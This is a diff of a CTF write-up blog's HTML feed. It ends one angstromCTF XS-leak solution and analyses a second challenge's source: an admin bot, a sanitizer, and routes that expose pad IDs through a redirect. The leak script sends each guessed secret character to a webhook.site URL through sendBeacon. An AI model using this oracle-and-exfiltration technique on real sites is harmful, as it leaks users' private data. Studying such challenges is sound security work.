+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> found <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;actf&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> leak_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> next <span style="color:#ff79c6">=</span> (i) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">=</span> charset[i]
+</span></span><span style="display:flex;"><span>      link <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;link&#34;</span>)
+</span></span><span style="display:flex;"><span>      link.rel <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;stylesheet&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(link)            
+</span></span><span style="display:flex;"><span>      link.onload <span style="color:#ff79c6">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>           found <span style="color:#ff79c6">+=</span> charset[i]
+</span></span><span style="display:flex;"><span>           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;success&#34;</span>, found<span style="color:#ff79c6">:</span>found,<span style="color:#ff79c6">char</span><span style="color:#ff79c6">:</span>charset[i] }))
+</span></span><span style="display:flex;"><span>           next(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       link.onerror <span style="color:#ff79c6">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>           next(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>       link.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff79c6">+</span>found<span style="color:#ff79c6">+</span>charset[i]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>next(<span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><h2 id="-flag">🚩 Flag</h2>
 <p><code>actf{the_w_watermarks_the_whereabouts}</code></p>]]></description>
       
     </item>
@@ -195,176 +195,174 @@ next(<span style="color:#bd93f9">0</span>)
 <h2 id="-initial-analysis">🔎 Initial analysis</h2>
 <p>We are given the application source code and a challenge link. Also there is a <code>bot.js</code> for the admin bot. So it was some client side challenge. Looking at the application,  its main functionality was to create pads (basically notes ) and view them. There was html and markdown allowed in the contents of the pad.</p>
 <p>Looking at the <code>bot.js</code> file .</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-    <span style="color:#8be9fd;font-style:italic">let</span> page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
-
-    <span style="color:#6272a4">// login 
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/user/login`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
-</span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// generate admin creds
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#username&#39;</span>, ADMIN_USERNAME);
-    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#password&#39;</span>, ADMIN_PASSWORD);
-    <span style="color:#6272a4">// click and wait for navigation
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
-        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
-        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
-    ]);
-
-    <span style="color:#6272a4">// create flag pad
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/p/new`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#title&#39;</span>, <span style="color:#f1fa8c">&#39;flag&#39;</span>);
-    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#content&#39;</span>, FLAG);
-    <span style="color:#6272a4">// click and wait for navigation
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
-        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
-        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
-    ])
-
-
-    <span style="color:#6272a4">// avoid leaking anything
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.close();
-    page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
-
-    page.on(<span style="color:#f1fa8c">&#39;console&#39;</span>, (msg) =&gt; {
-        console.log(<span style="color:#f1fa8c">&#39;[Console]&#39;</span>, msg);
-    });
-
-    <span style="color:#6272a4">// open the link
-</span><span style="color:#6272a4"></span>    console.log(<span style="color:#f1fa8c">`Visiting URL: https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> `</span>);
-    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
-
-</code></pre></div><p>After looking at <code>bot.js</code> it&rsquo;s clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#ff79c6">const</span> markdown <span style="color:#ff79c6">=</span> (md) =&gt; {
-        <span style="color:#ff79c6">return</span> md.replace(/__(.*?)__/gs, &#39;&lt;strong&gt;$1&lt;/strong&gt;&#39;)
-            .replace(/_(.*?)_/gs, &#39;&lt;em&gt;$1&lt;/em&gt;&#39;)
-            .replace(/## (.*?)\n/gs, &#39;&lt;h2&gt;$1&lt;/h2&gt;&#39;)
-            .replace(/# (.*?)\n/gs, &#39;&lt;h1&gt;$1&lt;/h1&gt;&#39;)
-            .replace(/!\[(.*?)\]\((.*?)\)/gs, &#39;&lt;img alt=&#34;$1&#34; src=&#34;$2&#34; /&gt;&#39;)
-            .replace(/\[(.*?)\]\((.*?)\)/gs, &#39;&lt;a href=&#34;$2&#34;&gt;$1&lt;/a&gt;&#39;)
-            .replace(/`(.*?)`/gs, &#39;&lt;code&gt;$1&lt;/code&gt;&#39;)
-            .replace(/\n/gs, &#39;&lt;br&gt;&#39;)
-    }
-    <span style="color:#8be9fd;font-style:italic">let</span> md <span style="color:#ff79c6">=</span> markdown(padcontent.dataset.content)
-    <span style="color:#ff79c6">const</span> sanitizer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Sanitizer()
-
-    padcontent.setHTML(md, { sanitizer })
-
-</code></pre></div><p>Looking at the code to create pads at the <code>/p/new</code> endpoint. We can see that there is a cookie called latest being set with a unique_id.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-router.post(<span style="color:#f1fa8c">&#39;/p/new&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
-    <span style="color:#8be9fd;font-style:italic">let</span> {title, content, isPublic, isTemp} <span style="color:#ff79c6">=</span> req.body
-
-    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Pad({
-        username<span style="color:#ff79c6">:</span> req.session.username,
-        title,
-        content,
-        isPublic<span style="color:#ff79c6">:</span> isPublic <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">true</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>,
-        createdAt<span style="color:#ff79c6">:</span> isTemp <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">undefined</span>
-    })
-    console.log(pad)
-    <span style="color:#ff79c6">await</span> pad.save()
-
-    res.cookie(<span style="color:#f1fa8c">&#39;latest&#39;</span>, {title, uniqueId<span style="color:#ff79c6">:</span> pad.uniqueId}, {
-        secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-        httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-        sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;none&#39;</span>,
-    })
-    
-    req.flash(<span style="color:#f1fa8c">&#39;success&#39;</span>, <span style="color:#f1fa8c">&#39;Pad created.&#39;</span>)
-    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)    
-})
-</code></pre></div><p>and the pad can be viewed by visiting that unique subdomain <code>unique_id.paaad.space</code> . Looking at the code for that.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
-     <span style="color:#6272a4">// get id from subdomain
-</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.subdomains[<span style="color:#bd93f9">0</span>]
-    <span style="color:#6272a4">// show the index page
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>id){
-        <span style="color:#8be9fd;font-style:italic">let</span> pads <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.find({username<span style="color:#ff79c6">:</span> req.session.username})
-        <span style="color:#ff79c6">return</span> res.render(<span style="color:#f1fa8c">&#39;index&#39;</span>, {
-            username<span style="color:#ff79c6">:</span> req.session.username,
-            latest<span style="color:#ff79c6">:</span> req.cookies.latest,
-            pads
-        })
-    }
-    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-    }
-
-    <span style="color:#6272a4">// find pad with id 
-</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.findOne({uniqueId<span style="color:#ff79c6">:</span> id})
-    
-</code></pre></div><p>here it is taking the id from <code>req.subdomains[0]</code> and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// login 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/user/login`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// generate admin creds
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#username&#39;</span>, ADMIN_USERNAME);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#password&#39;</span>, ADMIN_PASSWORD);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// click and wait for navigation
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
+</span></span><span style="display:flex;"><span>        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
+</span></span><span style="display:flex;"><span>        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
+</span></span><span style="display:flex;"><span>    ]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// create flag pad
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/p/new`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#title&#39;</span>, <span style="color:#f1fa8c">&#39;flag&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#content&#39;</span>, FLAG);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// click and wait for navigation
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
+</span></span><span style="display:flex;"><span>        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
+</span></span><span style="display:flex;"><span>        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// avoid leaking anything
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.close();
+</span></span><span style="display:flex;"><span>    page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    page.on(<span style="color:#f1fa8c">&#39;console&#39;</span>, (msg) =&gt; {
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#f1fa8c">&#39;[Console]&#39;</span>, msg);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// open the link
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    console.log(<span style="color:#f1fa8c">`Visiting URL: https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> `</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
+</span></span></code></pre></div><p>After looking at <code>bot.js</code> it&rsquo;s clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> markdown <span style="color:#ff79c6">=</span> (md) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> md.replace(/__(.*?)__/gs, &#39;&lt;strong&gt;$1&lt;/strong&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/_(.*?)_/gs, &#39;&lt;em&gt;$1&lt;/em&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/## (.*?)\n/gs, &#39;&lt;h2&gt;$1&lt;/h2&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/# (.*?)\n/gs, &#39;&lt;h1&gt;$1&lt;/h1&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/!\[(.*?)\]\((.*?)\)/gs, &#39;&lt;img alt=&#34;$1&#34; src=&#34;$2&#34; /&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/\[(.*?)\]\((.*?)\)/gs, &#39;&lt;a href=&#34;$2&#34;&gt;$1&lt;/a&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/`(.*?)`/gs, &#39;&lt;code&gt;$1&lt;/code&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/\n/gs, &#39;&lt;br&gt;&#39;)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> md <span style="color:#ff79c6">=</span> markdown(padcontent.dataset.content)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> sanitizer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Sanitizer()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    padcontent.setHTML(md, { sanitizer })
+</span></span></code></pre></div><p>Looking at the code to create pads at the <code>/p/new</code> endpoint. We can see that there is a cookie called latest being set with a unique_id.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.post(<span style="color:#f1fa8c">&#39;/p/new&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> {title, content, isPublic, isTemp} <span style="color:#ff79c6">=</span> req.body
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Pad({
+</span></span><span style="display:flex;"><span>        username<span style="color:#ff79c6">:</span> req.session.username,
+</span></span><span style="display:flex;"><span>        title,
+</span></span><span style="display:flex;"><span>        content,
+</span></span><span style="display:flex;"><span>        isPublic<span style="color:#ff79c6">:</span> isPublic <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">true</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>,
+</span></span><span style="display:flex;"><span>        createdAt<span style="color:#ff79c6">:</span> isTemp <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">undefined</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    console.log(pad)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> pad.save()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res.cookie(<span style="color:#f1fa8c">&#39;latest&#39;</span>, {title, uniqueId<span style="color:#ff79c6">:</span> pad.uniqueId}, {
+</span></span><span style="display:flex;"><span>        secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>        httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>        sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;none&#39;</span>,
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    req.flash(<span style="color:#f1fa8c">&#39;success&#39;</span>, <span style="color:#f1fa8c">&#39;Pad created.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)    
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>and the pad can be viewed by visiting that unique subdomain <code>unique_id.paaad.space</code> . Looking at the code for that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>     <span style="color:#6272a4">// get id from subdomain
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.subdomains[<span style="color:#bd93f9">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// show the index page
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>id){
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> pads <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.find({username<span style="color:#ff79c6">:</span> req.session.username})
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.render(<span style="color:#f1fa8c">&#39;index&#39;</span>, {
+</span></span><span style="display:flex;"><span>            username<span style="color:#ff79c6">:</span> req.session.username,
+</span></span><span style="display:flex;"><span>            latest<span style="color:#ff79c6">:</span> req.cookies.latest,
+</span></span><span style="display:flex;"><span>            pads
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// find pad with id 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.findOne({uniqueId<span style="color:#ff79c6">:</span> id})
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>here it is taking the id from <code>req.subdomains[0]</code> and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.</p>
 <h2 id="-attack-plan">🥷 Attack plan</h2>
 <p>So if we can manage to somehow get the admin pads unique_id , we can access his pad. So the idea is to somehow leak this unique subdomain. There is another feature of this application that I found interesting, that allows you to view the latest note created by a user.</p>
 <p>Looking at the code for that functionality.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-router.get(<span style="color:#f1fa8c">&#39;/p/latest&#39;</span>, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
-    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>req.cookies.latest){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;No latest päääd.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
-    }
-    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.cookies.latest.uniqueId
-    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-    }
-    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-})
-</code></pre></div><p>Basically, if we visit the endpoint <code>/p/latest</code> with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.get(<span style="color:#f1fa8c">&#39;/p/latest&#39;</span>, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>req.cookies.latest){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;No latest päääd.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.cookies.latest.uniqueId
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>Basically, if we visit the endpoint <code>/p/latest</code> with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad.</p>
